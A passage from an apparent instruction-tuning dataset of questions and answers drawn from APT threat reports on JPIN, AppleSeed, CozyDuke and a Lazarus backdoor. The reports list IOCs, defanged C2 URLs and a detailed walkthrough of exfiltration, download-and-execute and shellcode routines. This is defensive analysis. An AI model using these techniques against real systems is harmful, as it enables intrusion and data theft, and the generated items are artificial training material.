family relies on a small number of supported commands and simple shells, the other delves into more convoluted methods of injections, checks, and supported feature sets.\nMicrosoft researchers refer to one such set of backdoor variants collectively as \"JPIN,\" which is the name of a service it uses when installed. JPIN is a comprehensive tool for executing and extracting information from the compromised computer. There is strong evidence to suggest that the developers of the JPIN and Dipsind code bases were in some way related.\nJPIN has its own installer and uninstaller component, which deletes itself when it encounters a version of Windows earlier than Windows XP, or finds any of these security-related processes running:\nFigure 15. Security-related processes avoided by the JPIN installer\nAfter installing the backdoor, the installer deletes itself from the compromised computer.\nPLATINUM uses at least three distinct JPIN variants. One variant typically runs with a mutex named \"hMSVmm\" and installs itself in the folders %appdata%\\Comm\\Jpin and %userprofile%\\AppData\\Resource\\Jpin. After it is installed and started, the JPIN service can perform the following tasks, among others:\n\u2022 Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.\n\u2022 List running services, processes, job IDs, and task IDs.\n\u2022 Enumerate drives and their types.\n\u2022 Enumerate registry keys.\n\u2022 Load a custom keylogger.\n\u2022 Download files.\n\u2022 Download and upgrade itself.\n\u2022 Acquire network information such as DNS, IP, proxies, and so on.\n\u2022 Exfiltrate information over HTTP GET and POST requests, with the data stored either within the HTTP body or within the URL parameters.\n\u2022 Lower security settings by tampering with registry keys.\n\u2022 Inject content into the lsass.exe process, in order to load the keylogger module into lsass and call its exported function.\n\u2022 Communicate via FTP.\n\u2022 Send email via SMTP.\n\u2022 Change permissions on files using the cacls.exe command-line utility.\nJPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things.\nJPIN can target mobile suite applications and extract data from them.\nThe second JPIN variant is very similar to the first one. It downloads the backdoor payload from remote locations via the BITS service, using the COM object for BITS. This variant also has its own installer and uninstaller component, which deletes itself when it encounters a version of Windows earlier than Windows XP, or finds any of the processes listed in (<>)Figure 15 running.\nThe third known variant does not check for the processes listed in (<>)Figure 15. It uses an installer component that includes the backdoor as payload disguised as a bitmap within its resource section. The payload is in an encrypted and compressed form, disguised to avoid any suspicion from security solutions. This variant has been seen installing itself into the following file system paths:\n\u2022 %appdata%\\Java\\support\n\u2022 %appdata%\\support\n\u2022 %userprofile%\\AppData\\Local\\Java\\Support\n\u2022 %userprofile%\\AppData\\Local\\Support\nQ: What are the primary capabilities and features of the JPIN backdoor used by the PLATINUM APT group?",
    "output": "The JPIN backdoor is a comprehensive tool used by the PLATINUM APT group for executing and extracting information from compromised computers. Its capabilities include obtaining system information, listing running services and processes, enumerating drives and registry keys, loading a custom keylogger, downloading files, upgrading itself, acquiring network information, exfiltrating data over HTTP GET and POST requests, lowering security settings by tampering with registry keys, injecting content into the lsass.exe process, communicating via FTP, sending emails via SMTP, changing file permissions using cacls.exe, and targeting mobile suite applications to extract data from Symbian, Blackberry, and Windows Phone management applications.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 5.5.1. Proxy Malware\nAppleSeed also creates Proxy malware. The malware has the PDB path named localproxy as shown below.\n- PDB Path: D:\\Troy\\FProxy\\output\\x64\\localproxy.pdb\nAs its name suggests, the malware has a proxy feature and receives 2 IP addresses and port numbers\nfrom the command line argument to relay them. You can see from the routine below that it simply sends the buffer it has received back to the remote address without going through any conversion processes.\n- Command Line Argument: help:localproxy.exe RemoteIP RemotePort InternelIP InternelPort\nCurrently, no command line logs can be seen via the ASD infrastructure, but the ASEC team was able to find the history of the malware communicating with the URL shown below. It is identical to the C&C server address and the port number used in Meterpreter. While the proxy itself can be used in various forms, it appears that it was used to relay C&C communications of Meterpreter.\n- Remote Access History: 27.255.81[.]109:3015\nAhnLab's Response\nThe alias and the engine version information of AhnLab products are shown below. Even if the threat group's activities were recently discovered, AhnLab products may have detected related malware in the past. The ASEC team is tracking the activities of the group and is responding to related malware types, but there may be unidentified alterations that are yet to be detected.\nConclusion\nKimsuky group is continuously launching social engineering attacks, such as spear phishing, against companies, public institutions, and individual users. Recent cases have shown frequent uses of malware AppleSeed and PebbleDash. Such backdoors can stay in the system, receive commands from the attacker, and perform various malicious tasks. As various malware strains for remote control and collecting information are additionally installed, companies and users targeted by the Kimsuky group are at risk of having key information within the system stolen.\nWhen there is a suspicious-looking email in the inbox, users must refrain from opening the attached files within the email. Also, anti-malware solutions, such as AhnLab V3, must be regularly updated to the latest version to prevent malware infections.\nIOC (Indicators of Compromise)\nSome IOCs were referred to third-party analysis reports. Thus, some were not verified as the sample could not be confirmed. The content may be updated without notice if new information is found.\nFile Path and Name\nThe file paths and names used from the threat group are listed below. Some malware and tool file may have the same name as that of normal files.\nScript\nimage_confirm_v2.wsf\nBiden Administration Security Figures.wsf\nPlan for Establishing Control Tower in North Korea Denuclearization.wsf\n2021 **** Missions Service Survey.hwp.js\nKorean-Japan Relations.js\n*** News 2021-05-07.pdf jse\nPIF Dropper\nColon Cancer Case.pif\nProgress Check_211013.pdf file\n211014-915mm(0deg).h5.pif\n210927 Covid-19 Response (Boryeong-Taean 1)_merged_edited.PIF\nROK-US summit (May 21st) Reference Material (edited).pif\n2021 *** Work Report Edited.pif\nDownloader\n%ALLUSERSPROFILE%\\Intel\\Driverdriver.cfg\n%ALLUSERSPROFILE%\\Intel\\driver.cfg\n%APPDATA%\\Intel\\Driverdriver.cfg\nAppleSeed Installation Path\n%ALLUSERSPROFILE%\\Software\\Ahnlab\\Service\\AutoService.dll\n%ALLUSERSPROFILE%\\Software\\ControlSet\\Service\\ServiceScheduler.dll\n%ALLUSERSPROFILE%\\Software\\Defender\\Windows\\Update\\AutoUpdate.dll\n%ALLUSERSPROFILE%\\Software\\ESTsoft\\Common\\ESTCommon.dll\n%ALLUSERSPROFILE%\\Software\\KakaoTalk\\KaoUpdate.ini\n%ALLUSERSPROFILE%\\Software\\Microsoft\\AvastAntiVirus\\AvastUpdate.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Avg\\AvgSkin.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Network\\NetworkService.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Printer\\PrinterService.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Service\\TaskScheduler.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\AutoDefender\\UpdateDB.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\AutoPatch\\patch.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Chrome\\GoogleUpdate.dll %ALLUSERSPROFILE%\\Software\\Microsoft\\WIndows\\Defender\\AutoCheck.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Defender\\AutoUpdate.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Defender\\update.dll %ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Explorer\\FontChecker.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\FontChecker.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\MDF\\WDFSync\\WDFSync.dll %ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\MetaSec\\MetaSecurity.dll %ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Patch\\patch.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Patch\\plugin.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Secrity\\AutoCheck.dll\n%ALLUSERSPROFILE%\\Software\\Office\\Update.dll\n%APPDATA%\\ESTsoft\\AlLUpdat\\AlCommon.dll\n%APPDATA%\\ESTsoft\\AlLUpdate\\AlCommon.dll\n%APPDATA%\\ESTsoft\\Common\\ESTCommon.dll\n%APPDATA%\\ESTsoft\\Common\\ESTUpdate.exe\n%APPDATA%\\ESTsoft\\Common\\ko-kr.dll\n%APPDATA%\\ESTsoft\\updat\\ESTCommon.dll\n%APPDATA%\\Microsoft\\Windows\\Defender\\AutoUpdate.dll\n%APPDATA%\\Microsoft\\Windows\\Defender\\patch.dll\nQ: What specific measures should cybersecurity experts take to mitigate the risks posed by the Kimsuky group's use of AppleSeed and PebbleDash malware, particularly in the context of social engineering attacks like spear phishing?",
    "output": "To mitigate the risks posed by the Kimsuky group's use of AppleSeed and PebbleDash malware, cybersecurity experts should educate users to refrain from opening suspicious-looking emails and attached files. Additionally, they should ensure that anti-malware solutions, such as AhnLab V3, are regularly updated to the latest version to prevent malware infections. These measures are crucial because the Kimsuky group frequently employs social engineering tactics, such as spear phishing, to deliver malware that can stay in the system, receive commands from the attacker, and perform various malicious tasks, including stealing key information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What is the significance of the MPKBot IRC bot in relation to the Magic Hound campaign, and how is it related to the Rocket Kitten adversary group?",
    "output": "The MPKBot IRC bot is significant because it was found using the same IP for its C2 server as a Leash sample, indicating a possible link between the two. This MPK IRC bot is very similar to the MPK Trojan associated with the Rocket Kitten adversary group. Both versions of the MPK Trojan share considerable similarities in behavior and direct code overlap, suggesting that they are based on the same code base. This relationship highlights the potential connection between the Magic Hound campaign and the Rocket Kitten adversary group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: introduCtion\nToday's cybercriminals try to infect as many users as possible. Their goal is simple\u2014to monetize the resources or data from infected machines in any way they can. Behind such attacks are highly covert targeted campaigns known as APTs.\nWhile targeted campaigns continue to increase, research efforts by the security industry reveal that some of these attacks have existed for several years.1 Depending on the motive, APT campaigns may attack various industries, organizations or communities from different regions and countries. For instance, the Luckycat campaign targeted the aerospace, energy, engineering, shipping, and military research industries in India and Japan.2 Additionally, they targeted the Tibetan activists' community. The IXESHE campaign, on the other hand, targeted East Asian governments, Taiwanese electronics manufacturers, and a telecommunications company.3 While most of these campaigns have multiple targets, smaller, more subtle campaigns with exceedingly specific targets are also present. The Taidoor campaign is an example of this, where all of the compromise victims were from Taiwan, and the majority of which were government organizations.4\nThis research paper will delve into a targeted campaign that targets organizations and communities within South Korea. We call this malicious operation the \"HeartBeat campaign.\"\n1\n2\n3\n4\nQuestion: How does the HeartBeat APT campaign differ from broader cybercriminal operations in terms of its targeting strategy and objectives?",
    "output": "Answer: The HeartBeat APT campaign differs from broader cybercriminal operations in its targeting strategy and objectives. Unlike typical cybercriminals who aim to infect as many users as possible to monetize the resources or data from infected machines, APT campaigns like HeartBeat are highly covert and targeted. These campaigns focus on specific industries, organizations, or communities within particular regions and countries. For example, the Luckycat campaign targeted the aerospace, energy, engineering, shipping, and military research industries in India and Japan, as well as Tibetan activists. Similarly, the IXESHE campaign targeted East Asian governments, Taiwanese electronics manufacturers, and a telecommunications company. Smaller, more subtle campaigns like Taidoor focused exclusively on Taiwanese government organizations. The HeartBeat campaign specifically targets organizations and communities within South Korea, demonstrating a precise and focused approach characteristic of APTs.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: TREND MICROTM RESEARCH\nTrend Micro, a global leader in cybersecurity, helps to make the world safe for exchanging digital information.\nTrend Micro Research is powered by experts who are passionate about discovering new threats, sharing key insights, and supporting efforts to stop cybercriminals. Our global team helps identify millions of threats daily, leads the industry in vulnerability disclosures, and publishes innovative research on new threat techniques. We continually work to anticipate new threats and deliver thought-provoking research.\n\nHow does Trend Micro Research contribute to the global effort against cybercrime, and what specific activities do they engage in to identify and mitigate threats?",
    "output": "Trend Micro Research contributes to the global effort against cybercrime by leveraging a team of experts who are dedicated to discovering new threats and sharing critical insights. Their activities include identifying millions of threats daily, leading the industry in vulnerability disclosures, and publishing innovative research on new threat techniques. Additionally, they continually work to anticipate new threats and deliver thought-provoking research, thereby supporting efforts to stop cybercriminals.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the primary functionalities of the second stage malware components such as cmd_task.dll and screenshot_task.dll in the CozyDuke APT, and how are they configured and executed?",
    "output": "The second stage malware components of the CozyDuke APT include cmd_task.dll and screenshot_task.dll. cmd_task.dll is a 32-bit DLL used to create new processes, perform as a command line shell, and execute various other tasks. screenshot_task.dll is a 32-bit DLL used to take screenshots of the full desktop window and save them as bitmaps in the %temp% directory. The number of times the screenshot is repeated is configurable within an XML task file. Each of these payloads is delivered with a configuration file that explains how to run them. For example, ChromeUpdate.exe starts the file with 'rundll32 cache.dll,ADB_Setup', where cache.dll is a large backdoor maintaining both code and data in encrypted blobs.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: \"NTPR\nP6k+pR6iIKwJpU6oR6ZilgKPL7IxsitJAnpIYSx2KldSSRFFyUIzTBVFAwgzBkI2PS/+EgASBik/GgYBwBbRNy7pP+Xq4uTsxOXU6NPmudaEz7Xy5\nThe binary decrypts the above parameter using a custom algorithm displayed in figure 11. The list of resulting strings contains multiple C2 servers:\nThe following URLs have been decrypted:\nhttps[:]//mante.li/images/draw.php https[:]//bmanal.com/images/draw.php https[:]//shopandtravelusa.com/vendor/monolog/monolog/src/Monolog/monolog.php\nhttps[:]//industryinfostructure.com/templates/worldgroup/view.php\nThe GetNetworkParams routine is used to retrieve network parameters for the local computer:\nThe malicious process extracts the name of the DNS domain assigned to the local host (0x2 = ComputerNameDnsDomain):\nThe following network information is written to a temporary buffer:\nThe process gets the username associated with the current thread by calling the GetUserNameW function:\nThe binary takes a snapshot of all processes in the system using the CreateToolhelp32Snapshot API (0x2 = TH32CS_SNAPPROCESS):\nThe file extracts information about the first process from the snapshot via a call to Process32FirstW:\nThe malicious binary opens the process object using the OpenProcess routine (0x410 = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ):\nWhether the file doesn't have enough rights to open a process, it copies \"Unknown\" along with the process name to a temporary buffer.\nThe binary takes a snapshot of the current process along with all its modules using the CreateToolhelp32Snapshot API (0x8 = TH32CS_SNAPMODULE):\nModule32FirstW is utilized to retrieve information about the first module associated with the current process:\nThe malicious DLL gets information about the next process recorded in the snapshot:\nThe OpenProcessToken routine is used to open the access token associated with a process (0x8 = TOKEN_QUERY):\nGetTokenInformation is utilized to extract the user account of the token (0x1 = TokenUser):\nThe process retrieves the name of the account for a SID and the name of the first domain on which the SID is found via a function call to LookupAccountSidW:\nGetTokenInformation is utilized to extract the Terminal Services session identifier associated with the token (0xC = TokenSessionId):\nThe RtlGetCompressionWorkSpaceSize API is used to determine the correct size of the WorkSpace buffer for the RtlCompressBuffer function (0x102 = COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM):\nThe process compresses the buffers from figures 15 and 16 using the RtlCompressBuffer function (0x102 = COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM):\nThe DLL randomly chooses a C2 server from the list of four. It initializes the application's use of the WinINet functions via a call to InternetOpenW:\nInternetCanonicalizeUrlW is used to canonicalize the URL:\nThe malware cracks the URL into its component parts by calling the InternetCrackUrlW API:\nThe connect, send and receive timeouts are set to 150s using the InternetSetOptionW routine (0x2 =\nINTERNET_OPTION_CONNECT_TIMEOUT, 0x5 = INTERNET_OPTION_SEND_TIMEOUT, 0x6 =\nBig Headline: INTERNET_OPTION_RECEIVE_TIMEOUT):\nThe DLL opens an HTTP session to the C2 server on port 443 (0x3 = INTERNET_SERVICE_HTTP):\nThe binary creates a POST request handle to the URI extracted from the specified URL:\nThe security flags for the handle are set using the InternetSetOptionW API (0x1F = INTERNET_OPTION_SECURITY_FLAGS, 0xF180 = SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTP | SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTPS):\nThe buffer (concatenation of two buffers) that was compressed earlier is encrypted using XOR (key = 32-byte array):\nThe encrypted buffer from above is encoded using Base64:\nThe binary constructs the following parameters \"search=YOIPOUP&ei=6128&oq=<Base64-encoded buffer>\":\nThe User Agent extracted earlier is added to the HTTP request handle using the HttpAddRequestHeadersW routine (0xA0000000 = HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD):\nHttpSendRequestW is used to exfiltrate data to the C2 server:\nIt's worth mentioning that all C2 servers were down during our analysis. We've emulated network connections using FakeNet.\nThe size of the C2 response is retrieved by calling the HttpQueryInfoW routine (0x5 = HTTP_QUERY_CONTENT_LENGTH):\nThe binary copies the C2 response to a buffer via a function call to InternetReadFile:\nThe malicious process parses the data between the \"<html></html>\" and \"<div></div>\" tags:\nThe malware performs a similar POST request with different parameter values \"search=DOWPANY&ei=6128\":\nThe C2 response is decoded using Base64, and then XOR decrypted. The malware implements 4 different actions that will be explained based on the EAX register value:\nBig Headline: EAX = 1 \u2013 download and execute a .exe file\nThe binary gets the AppData folder path by calling the SHGetFolderPathW routine (0x1c = CSIDL_LOCAL_APPDATA):\nGetTickCount is used to extract the number of milliseconds that have elapsed since the system was started:\nThe malware creates a file based on the above value (0x40000000 = GENERIC_WRITE, 0x1 = FILE_SHARE_READ, 0x2 = CREATE_ALWAYS, 0x80 = FILE_ATTRIBUTE_NORMAL):\nThe newly created file is populated with content that is supposed to be transmitted by the C2 server:\nThe malicious binary executes the file by calling the CreateProcessW API:\nBig Headline: EAX = 3 \u2013 copy and execute shellcode\nThe process allocates memory using the VirtualAlloc routine (0x1000 = MEM_COMMIT, 0x40 = PAGE_EXECUTE_READWRITE):\nThe DLL implements an anti-analysis check. It calls the isProcessorFeaturePresent API in order to determine whether _fastfail() is available. If this feature is not supported, the current process is terminated by calling the GetCurrentProcess and TerminateProcess functions (0x17 = PF_FASTFAIL_AVAILABLE):\nThe malware jumps to the shellcode and then frees the memory area allocated earlier:\nAs we mentioned at the beginning of the analysis, the threat actor only added the export function explained above, and the others are legitimate.\nWe've studied a legitimate Notepad++ shell extension (SHA256: f3e2e6f9e7aa065e89040a0c16d1f948489b3751e5eb5efac8106d5f7d65d98d 64-bit) and compared the export functions between the 2 files. As we can see below, the functions are very similar:\nReferences\nMSDN: (<https://docs.microsoft.com/en-us/windows/win32/api/>)https://docs.microsoft.com/en-us/windows/win32/api/\nFakenet: (<https://github.com/fireeye/flare-fakenet-ng>)https://github.com/fireeye/flare-fakenet-ng\nVirusTotal: (<https://www.virustotal.com/gui/file/803dda6c8dc426f1005acdf765d9ef897dd502cd8a80632eef4738d1d7947269>)https://www.virustotal.com/gui/file/803dda6c8dc426f1005acdf765d9ef897dd502cd8a80632eef4738d1d7947269\nMalwareBazaar: (<https://bazaar.abuse.ch/sample/803dda6c8dc426f1005acdf765d9ef897dd502cd8a80632eef4738d1d7947269/>)https://bazaar.abuse.ch/sample/803dda6c8dc426f1005acdf765d9ef897dd502cd8a80632eef4738d1d7947269/\n\nAnswer this question based on the above context: Describe the anti-analysis technique employed by the Lazarus APT malware when executing shellcode. Why is this technique significant in evading detection?",
    "output": "The Lazarus APT malware employs an anti-analysis technique by checking if the _fastfail() feature is available using the isProcessorFeaturePresent API. If this feature is not supported, the malware terminates the current process by calling GetCurrentProcess and TerminateProcess. This technique is significant in evading detection because it helps the malware identify if it is running in a controlled environment, such as a virtual machine or sandbox, where certain processor features might not be available. By terminating the process in such environments, the malware can avoid being analyzed and detected by security researchers and automated analysis tools.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Devolved responsibility for cyber-security\n3.1 The Department of Health (the Department) has overall national responsibility for cyber-security resilience and responding to incidents in the health sector. However, the Department devolves responsibility for managing cyber-security to local organisations \u2013 NHS trusts, GPs, clinical commissioning groups and social care providers. Regulators and other national bodies oversee and support local NHS organisations. While NHS foundation trusts are directly accountable to Parliament for delivering healthcare services, they are held to account by the same regulators as NHS trusts. Roles and responsibilities for cyber-security as at September 2017 are set out in Figure 4 on pages 22 and 23. In particular:\n\u2022 NHS Improvement holds trusts and NHS foundation trusts to account for delivering value for money; and\n\u2022 the Care Quality Commission (CQC) regulates health and social care providers for safety and quality of their services.\n3.2 Both bodies can mandate local NHS organisations to improve their performance. They also have a role in ensuring that local bodies have appropriate cyber-security arrangements, but neither are primarily concerned with cyber or information technology issues. NHS Digital provides guidance, alerts and support to local organisations on cyber-security, and can visit organisations to evaluate cyber-security arrangements if asked to do so, as part of CareCERT Assure.4 However, NHS Digital cannot mandate a local body to take remedial action even if it has concerns about the vulnerability of that organisation.\n4 Prior to the WannaCry attack, NHS Digital offered an on-site inspection to hospitals to assess their cyber-security. This was known as 'CareCERT Assure' and was voluntary. NHS national bodies are currently revising this system.\n\nHow does the devolution of cyber-security responsibilities within the NHS impact its ability to respond to cyber threats like the WannaCry attack? Discuss the roles of key organizations and the limitations of their authorities.",
    "output": "The Department of Health has overall national responsibility for cyber-security resilience and incident response in the health sector. However, it devolves the actual management of cyber-security to local organizations such as NHS trusts, GPs, clinical commissioning groups, and social care providers. Key organizations involved in oversight and support include NHS Improvement, which holds trusts accountable for delivering value for money, and the Care Quality Commission (CQC), which regulates health and social care providers for the safety and quality of their services. Both bodies can mandate improvements but are not primarily focused on cyber or IT issues. NHS Digital provides guidance, alerts, and support on cyber-security and can conduct on-site inspections through programs like CareCERT Assure. However, NHS Digital lacks the authority to mandate remedial actions even if it identifies vulnerabilities. This devolved structure means that while there is guidance and support available, the ultimate responsibility for cyber-security lies with local organizations, which may lead to inconsistencies in preparedness and response capabilities across the NHS.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: APPENDIX C: VPSNOC Email Header Analysis\nThe Kansas-City-based hosting provider sent an introductory email message on July 24th, 2013 at 1500 CDT and would be received by TCIRT at 1400 EDT and VPSNOC on Thursday July 25th, 2013 at 1200 PKT. 49\nAnalysis of the VPSNOC email50 header indicated that the message was sent on Thursday 25 July at 02:28:41 +0500 GMT, which is consistent with Pakistan's time zone. Of note, the email message was sent with an X-Originating IP Address of 184.75.214.10 corresponding to a Private Internet Access51 Canadian proxy52. VPSNOC's use of this commercial proxy service likely demonstrates the intent to mask the apparent origin of the sender.\nThese two examples highlight that VPSNOC's inbound and outbound email communications consistently utilized a +0500 Pakistani timezone.\n49  Digital Appendix 1: Raw Email Communications; Email#1 Subject- Re- Contact Info (Date- Wed, 24 Jul 2013 14-00-29 -0500).eml\n50  Digital Appendix 2: Raw Email Communications; Email#2 Subject- Re- Contact Info (Date- Thu, 25 Jul 2013 02-28-41 +0500).eml\n51  https://www.privateinternetaccess.com\n52  http://pastebin.com/F261NfYa\nMedium Headline: Inconsistency #1: Day & Date Misalignment within image1.png Screenshot\nOur review of the \"Response_ThreatConnect.docx\"53 focused in on the email screenshot (Figure 3) image1.png54 that Khan provided revealing that the date probably had been modified to appear as though they were the first to notify VPSNOC. Within the official response, Zubair Khan indicated that Tranchulas was \"already aware of this incident...and contacted hosting company.\" The official response included a screenshot depicting an email sent to VPSNOC from an unidentified (redacted) tranchulas.com email address that was sent on \"Tue, Jul 21, 2013 at 11:36 PM\" with no evidence of the date in which it was received by or responded to by VPSNOC. This message contained a notable misalignment between the date and day of the week.\nJuly 21, 2013 was a Sunday, not a Tuesday. \"Tuesday\" would have pre-dated our official notification that occurred on Wednesday July 24, 2013, and could indicate that Tranchulas may have obtained insight into the original TCIRT notification through Pakistan-based contacts within VPSNOC. The TCIRT subsequently responded to Mr. Khan's official explanation with a follow-up inquiry, offering Khan an opportunity to explain the date inconsistency within the email screenshot. Mr. Khan deferred our request to Mr. Hamza Qamar55, a Penetration Testing Team Lead at Tranchulas, who later responded56 with a simple denial that the email message had not been altered apart from blurring the name of the original sender.\nQuestion: What inconsistency was found in the email screenshot provided by Zubair Khan, and how might this discrepancy indicate potential insider knowledge or manipulation?",
    "output": "Answer: The inconsistency found in the email screenshot provided by Zubair Khan was a misalignment between the date and the day of the week. The email was purportedly sent on 'Tue, Jul 21, 2013 at 11:36 PM,' but July 21, 2013, was actually a Sunday. This discrepancy suggests that the email may have been altered to create the impression that Tranchulas was aware of the incident before TCIRT's official notification on Wednesday, July 24, 2013. This could indicate that Tranchulas obtained prior knowledge of the notification through Pakistan-based contacts within VPSNOC, implying potential insider information sharing or manipulation of the timeline to cover up their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: REFERENCES\nBlasco, J.\t (2012,\t January 12). Sykipot variant hijacks DOD and Windows smart cards.\t Retrieved February\t05,\t 2012,\t from Alienvault Labs: http://labs.alientvault.com/labs/index.php/2012/when\u00adthe\u00adapt\u00adowns\u00adyour\u00adsmart\u00adcards\u00adand\u00adcerts/\nCommand Five Pty\t Ltd.\t (2011,\t June). Advanced Persistent Threats: A\t Decade\t in Review. Retrieved\t September 24, 2011,\tfrom Command\t Five Pty\tLtd:\t http://www.commandfive.com/papers/C5_APT_ADecadeInReview.pdf\nCommand Five Pty\t Ltd.\t (2011,\t September).\t SK\t Hack\t by an Advanced Persistent Threat.\t Retrieved January\t06, 2012,\t from Command\t Five Pty\tLtd: http://www.commandfive.com/papers/C5_APT_SKHack.pdf\nCommon Computer Security Standards.\t(n.d.).\t Digital\t Certificates Used by\t Malware.\t Retrieved February 02, 2012,\t from CCSS Forum: http://www.ccssforum.org/malware\u00adcertificates.php?&pag=4\nCoviello,\t A.\t (2011,\t March\t17).\t Open Letter to\t RSA Customers.\t Retrieved\t June 13,\t 2011, from\t RSA:\t http://www.rsa.com/node.aspx?id=3872\nDeutsch,\t P. (1996, May).\t DEFLATE\t Compressed Data Format Specification version 1.3.\t Retrieved\t January 08,\t 2012,\t from IETF\tRFC 1951: http://www.ietf.org/rfc/rfc1951.txt\nDeutsch,\t P. (1996, May).\t ZLIB Compressed Data Format Specification version 3.3.\t Retrieved January\t25,\t 2012,\t from IETF\tRFC 1951: http://www.ietf.org/rfc/rfc1950.txt\nDoctor Web.\t (2011, December 29).\t Dr. Web\t Anti\u00advirus \u00adHow To Remove Virus (Trojan.DownLoader4.20396) \u00ad[DRWEBHK.COM].\t Retrieved\t December 29,\t 2011, from\t Dr.\t Web HK:\t http://www.drwebhk.com/en/virus_techinfo/Trojan.DownLoader4.20396.html\nDomainTools,\t LLC.\t (n.d.). 203.160.67.131 \tIP\t Address | WHOIS \t| DomainTools.com. Retrieved from DomainTools: http://whois.domaintools.com/203.160.67.131\nDr.\t Web. (2011,\t July\t 10). Dr.Web \u00adinnovation IT\u00adsecurity\t solutions. Complex protection against Internet threats. Retrieved\t 02 03,\t 2012, from\t Dr.Web:\thttp://vms.drweb.com/virus/?i=1007435\nFagerland,\t S.\t (2011,\t November 17).\t Invisible YNK, a Code\t Signing Conundrum | Norman Blog.\t Retrieved\t December 13,\t 2011, from\t Norman.com: http://blogs.norman.com/2011/malware\u00addetection\u00adteam/invisble\u00adynk\u00ada\u00adcode\u00adsigning\u00adconundrum\nF\u00adSecure Corporation. (n.d.). Threat Description: Backdoor: W32/Hupigon.\t Retrieved\t December 23, 2011,\t from\t F\u00adSecure:\thttp://www.f\u00adsecure.com/v\u00addescs/backdoor_w32_hupigon.shtml\nGFI Sandbox.\t (2010,\t May\t07).\t GFI Sandbox Analysis Report.\t Retrieved\t January 06,\t2011,\tfrom\t GFI\t Sandbox: http://xml.ssdsandbox.net/index.php/37405d5bcf64fb9547cacda95f4ce8b4\nGFI \tSandBox. (2011, August\t 04).\t GFI SandBox Analysis Report.\t Retrieved\t October 17, 2011,\t from GFI\tSandBox: http://xml.ssdsandbox.net/index.php/91a268b317d2cc6569b85bb03a5ff841\nGFI \tSandBox. (2011, July\t15).\t GFI SandBox Malware Analysis Report: Trojan.Win32.AgentBypass.\t Retrieved\t August 25,\t 2011, from\t http://xml.ssdsandbox.net/view/fdf2c5c2b1874efe7fd335092df2d3bc\nGFI \tSandbox.\t (2011,\t September 04). GFI Sandbox Malware Analysis Report: Trojan.Win32.Generic.\t Retrieved\t January\t06,\t 2012,\t from GFI\tSandbox: http://xml.ssdsandbox.net/index.php/9addc6d573309399e2b878873a00a921\nGFI \tSandBox. (2011, May\t29).\t GFI SandBox Malware Analysis Report: Trojan.Win32.Generic!SB Trojan.Trojan.Win32.Generic.\t Retrieved September 2011, 2011,\t from\t http://www.xml.ssandbox.net/view/bce1069dd099f15170c5fd05bae921b5\nGFI \tSandbox.\t (2011,\tMarch\t 20).\t GFI Sandbox Malware Analysis Report: Trojan\u00adDropper.Win32.Wykores.\t Retrieved January\t06,\t 2012,\t from GFI\tSandbox: http://xml.ssdsandbox.net/index.php/0d38d6c2b9eb817b40afc4272545a43b\nGFI \tSoftware. (2010, December 26). CWSandbox Report by MD5 \tat Sunbelt Security. Retrieved\t December 27, 2011,\t from Sunbelt Security: http://www.sunbeltsecurity.com/partnerresources/cwsandbox/md5.aspx?id=19b0227bec75bef93c6ccc 549b6d2ba0\nHispasec Sistemas.\t (2009,\t April 15). Antivirus scan for 70a88091e1f9a7bee246488cce79936a at 2009\u00ad04\u00ad15 11/52/02 UTC.\t Retrieved\t February 02,\t2012,\t from\t VirusTotal:\t https://www.virustotal.com/file/63ac63f59700dbcc3778a9c1e9f5689869c86ac2aa3295ad93278f9244c ff7f4\nHispasec Sistemas.\t (2010,\t May\t22).\t Antivirus\tscan for\t5bc597e48270f04ec9b683432432e352 at 2010\u00ad05\u00ad22 17/52/37 UTC \u00adVirusTotal.\t Retrieved February\t07,\t 2012,\t from VirusTotal: https://www.virustotal.com/file/e4711259a3dd9af85b649cc8afcf34bc86d1d68ed7286db35f7b260e60 27c110/analysis/\nHispasec Sistemas.\t (2011,\t August 15).\t Antivirus scan for\t 